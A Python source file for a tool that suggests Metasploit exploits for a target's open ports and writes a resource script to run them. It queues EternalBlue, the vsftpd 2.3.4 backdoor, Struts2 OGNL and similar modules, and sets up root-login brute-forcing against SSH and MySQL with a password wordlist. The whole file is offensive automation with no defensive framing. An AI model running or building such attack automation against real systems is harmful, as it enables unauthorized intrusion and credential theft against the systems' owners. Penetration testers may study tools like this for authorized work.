#!/usr/bin/env python3
import subprocess
from colorama import Fore

class MetasploitSuggester:
    def __init__(self, target, ports):
        self.target = target
        self.ports = ports
        self.suggestions = []
    
    def suggest_exploits(self):
        """Suggest Metasploit exploits based on services"""
        exploit_db = {
            21: {
                'exploits': [
                    'exploit/unix/ftp/vsftpd_234_backdoor',
                    'exploit/windows/ftp/filezilla_server_banner'
                ],
                'commands': [
                    'use exploit/unix/ftp/vsftpd_234_backdoor',
                    f'set RHOST {self.target}',
                    'set RPORT 21',
                    'exploit'
                ]
            },
            22: {
                'exploits': [
                    'auxiliary/scanner/ssh/ssh_login',
                    'exploit/linux/ssh/libssh_auth_bypass'
                ],
                'commands': [
                    'use auxiliary/scanner/ssh/ssh_login',
                    f'set RHOSTS {self.target}',
                    'set USERNAME root',
                    'set PASS_FILE /usr/share/wordlists/metasploit/password.lst',
                    'run'
                ]
            },
            445: {
                'exploits': [
                    'exploit/windows/smb/ms17_010_eternalblue',
                    'exploit/windows/smb/ms08_067_netapi'
                ],
                'commands': [
                    'use exploit/windows/smb/ms17_010_eternalblue',
                    f'set RHOST {self.target}',
                    'set RPORT 445',
                    'check',
                    'exploit'
                ]
            },
            80: {
                'exploits': [
                    'auxiliary/scanner/http/dir_scanner',
                    'exploit/multi/http/struts2_content_type_ognl'
                ],
                'commands': [
                    'use auxiliary/scanner/http/dir_scanner',
                    f'set RHOSTS {self.target}',
                    'run'
                ]
            },
            3306: {
                'exploits': [
                    'auxiliary/scanner/mysql/mysql_login',
                    'exploit/multi/mysql/mysql_udf_payload'
                ],
                'commands': [
                    'use auxiliary/scanner/mysql/mysql_login',
                    f'set RHOSTS {self.target}',
                    'set USERNAME root',
                    'set PASS_FILE /usr/share/wordlists/metasploit/password.lst',
                    'run'
                ]
            }
        }
        
        for port, service in self.ports:
            if port in exploit_db:
                self.suggestions.append({
                    'port': port,
                    'service': service,
                    'exploits': exploit_db[port]['exploits'],
                    'msf_commands': exploit_db[port]['commands']
                })
        
        return self.suggestions
    
    def generate_msf_script(self):
        """Generate Metasploit resource script"""
        script_content = "# Auto-generated Metasploit script\n"
        script_content += f"setg RHOST {self.target}\n"
        script_content += "setg LHOST 127.0.0.1\n"
        
        for suggestion in self.suggestions:
            script_content += f"\n# Exploit for port {suggestion['port']} - {suggestion['service']}\n"
            for cmd in suggestion['msf_commands']:
                if cmd.startswith('use'):
                    script_content += f"{cmd}\n"
                elif cmd.startswith('set'):
                    script_content += f"  {cmd}\n"
                elif cmd in ['run', 'exploit', 'check']:
                    script_content += f"  {cmd}\n"
        
        with open('reports/msf_commands.rc', 'w') as f:
            f.write(script_content)
        
        return "reports/msf_commands.rc"